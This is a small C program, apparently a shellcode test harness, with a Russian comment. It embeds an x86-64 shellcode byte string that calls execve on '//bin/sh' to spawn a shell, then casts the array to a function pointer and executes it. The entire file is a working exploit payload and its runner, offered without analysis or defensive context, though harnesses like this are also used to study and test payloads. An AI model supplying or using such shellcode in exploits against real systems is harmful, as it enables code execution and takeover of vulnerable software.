#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xc0\xb0\x3b\x0f\x05";

int main() {
    printf("Shellcode Length: %ld\n", sizeof(code) - 1);
    
    // Объявляем указатель на функцию и направляем его на наш массив с кодом
    void (*ret)() = (void(*)())code;
    
    // Запускаем
    ret();
    
    return 0;
}